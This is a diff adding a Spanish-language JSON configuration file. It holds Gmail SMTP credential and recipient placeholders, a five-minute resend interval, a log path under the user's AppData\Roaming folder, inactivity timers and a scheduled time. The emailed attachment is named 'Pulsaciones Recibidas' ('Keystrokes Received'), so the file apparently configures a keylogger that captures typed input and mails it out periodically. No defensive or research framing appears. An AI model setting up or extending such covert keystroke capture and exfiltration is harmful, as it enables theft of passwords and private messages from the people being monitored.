@@ -1,0 +1,21 @@
+{
+    "configuracion":
+    {
+        "remitente": "email@gmail.com",
+        "remitente_psw": "token genrado por app",
+        "destinatarios": ["destinatario@gmail.com"],
+        "asunto_correo": "Prueba de Correo",
+        "cuerpo_correo": "Esta es una Prueba del Servicio de Correo EmailMessage Usando SMTP en Python.",
+        "nombre_log_adjunto": "Pulsaciones Recibidas",
+        "puerto": 587,
+        "dominio": "gmail.com",
+        "tiempo_reenviar_correo": 5,
+
+        "ruta_log": "C:Users\\%username%\\AppData\\Roaming\\",
+        "nombre_log": "",
+        "horas_inactivo": 0,
+        "minutos_inactivo": 0,
+        "segundos_inactivo": 0,
+        "hora_programada": [10,55,0]
+    }
+}
